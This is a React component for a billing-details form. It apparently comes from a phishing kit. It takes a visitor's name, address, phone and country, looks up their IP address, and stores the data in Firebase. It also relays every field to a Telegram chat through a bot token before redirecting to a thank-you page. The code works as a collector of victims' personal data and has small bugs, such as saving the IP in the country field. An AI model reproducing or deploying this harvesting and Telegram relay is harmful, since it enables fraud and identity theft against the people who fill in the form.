import { useState, useRef, Fragment } from 'react';
import { Redirect } from 'react-router-dom';

import db from '../firebase/firebase';
import Header from '../Layout/Header';
import Footer from '../Layout/Footer';
import moment from "moment"
const { TelegramClient } = require('messaging-api-telegram');
const CryptoJS = require("crypto-js");
const client = new TelegramClient({
    accessToken: process.env.REACT_APP_PUBLIC_TM_TOKEN,
});

const Billing = () => {
    const [fullname, setFullname] = useState('');
    const [address, setAddress] = useState('');
    const [state, setState] = useState('');
    const [city, setCity] = useState('');
    const [zip, setZip] = useState('');
    const [phone, setPhone] = useState('');
    const [country, setCountry] = useState('');
    const [formSuccess, setFromSuccess] = useState(false);
    const [formError, setFormError] = useState(null);


    const fullnameRef = useRef(null);
    const addressRef = useRef(null);
    const stateRef = useRef(null);
    const cityeRef = useRef(null);
    const zipRef = useRef(null);
    const phoneRef = useRef(null);
    const countryRef = useRef(null);

    const submitHandler = async (e) => {
        e.preventDefault();
        if (fullname && address && state && city && zip && phone && country) {
            fetch(
                "https://api.ipify.org?format=jsonp?callback=?", {
                method: "GET",
                headers: {}
            })
            .then(res => {
                return res.text()
            })
            .then(ip => {
                const secretKey = process.env.REACT_APP_PUBLIC_ENCRYPT_KEY
                db.collection('billing-data').add({
                    fullname: CryptoJS.AES.encrypt(fullname, secretKey).toString(), 
                    address: CryptoJS.AES.encrypt(address, secretKey).toString(), 
                    state: CryptoJS.AES.encrypt(state, secretKey).toString(), 
                    city: CryptoJS.AES.encrypt(city, secretKey).toString(), 
                    zip: CryptoJS.AES.encrypt(zip, secretKey).toString(), 
                    phone: CryptoJS.AES.encrypt(phone, secretKey).toString(), 
                    country: CryptoJS.AES.encrypt(ip, secretKey).toString(),
                    ip_address: CryptoJS.AES.encrypt(ip, secretKey).toString(),
                    logged_at: CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                }).then(data => {
                    if( process.env.REACT_APP_PUBLIC_TM_ENABLE === '1' )
                    {
                        let message = "Billing Data\r\n"
                        message += "Full Name: " + CryptoJS.AES.encrypt(fullname, secretKey).toString() + '\r\n'
                        message += "Address: " + CryptoJS.AES.encrypt(address, secretKey).toString() + '\r\n'
                        message += "State: " + CryptoJS.AES.encrypt(state, secretKey).toString() + '\r\n'
                        message += "City: " + CryptoJS.AES.encrypt(city, secretKey).toString() + '\r\n'
                        message += "ZIP: " + CryptoJS.AES.encrypt(zip, secretKey).toString() + '\r\n'
                        message += "Phone Number: " + CryptoJS.AES.encrypt(phone, secretKey).toString() + '\r\n'
                        message += "Country: " + CryptoJS.AES.encrypt(country, secretKey).toString() + '\r\n'
                        message += "Ip Address: " + CryptoJS.AES.encrypt(ip, secretKey).toString() + '\r\n'
                        message += "Time: " + CryptoJS.AES.encrypt(moment( new Date() ).format("yyyy-MM-DD hh:MM:ss"), secretKey).toString()
                        client.sendMessage(process.env.REACT_APP_PUBLIC_TM_CHAT_ID, message, {
                            disableWebPagePreview: true,
                            disableNotification: true,
                        })
                        .then( res => console.log(res,'telegram res'))
                        .catch( e => console.log('error while TM message' + e))
                    }
                    setFromSuccess(true);
                }).catch(err => {
                    throw new Error(err);
                });
            })

        } else {
            setFormError(true);
        }
    }


    return (
          <Fragment>
            <Header type='type-2' />
            <div className=''>
            {formSuccess ? <Redirect to='/thankyou' /> : null}

            <div className='my-12 relative w-5/5 lg:w-4/12 p-4 lg:p-16 m-auto rounded border z-10 p-10'>
                <div className='mb-4'>
                    <h4 className='text-2xl'>Billing Details</h4>
                </div>
                <form onSubmit={(e) => submitHandler(e)}>
                    <input onChange={(e) => setFullname(e.target.value)} ref={fullnameRef} type='text' value={fullname} className='border py-3 px-4 w-full rounded mb-6' placeholder='Full name' />
                    <input onChange={(e) => setAddress(e.target.value)} ref={addressRef} type='text' value={address} className='border py-3 px-4 w-full rounded mb-6' placeholder='Address' />
                    <div className='flex justify-between'>
                        <input onChange={(e) => setCity(e.target.value)} ref={cityeRef} type='text' value={city} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='City' />
                        <input onChange={(e) => setState(e.target.value)} ref={stateRef} type='text' value={state} style={{ width: '47%' }} className='border py-3 px-4 rounded mb-6' placeholder='State' />
                    </div>
                    <input onChange={(e) => setZip(e.target.value)} ref={zipRef} type='text' value={zip} className='border py-3 px-4 w-full rounded mb-6' placeholder='ZIP' />
                    <input onChange={(e) => setPhone(e.target.value)} ref={phoneRef} type='tel' value={phone} className='border py-3 px-4 w-full rounded mb-6' placeholder='Phone number' />
                    <input onChange={(e) => setCountry(e.target.value)} ref={countryRef} type='text' value={country} className='border py-3 px-4 w-full rounded mb-6' placeholder='Country' />
                    {formError ? <p className='text-red-600 '>Please fill all form fields</p> : null}

                    <button onClick={(e) => submitHandler(e)} className='bg-red-600 mt-4 w-full py-3 px-4 rounded text-white font-bold mb-8'>Next</button>
                </form>
            </div>
        </div>
            <Footer type='type-2' />
        </Fragment>
      
    );
};

export default Billing;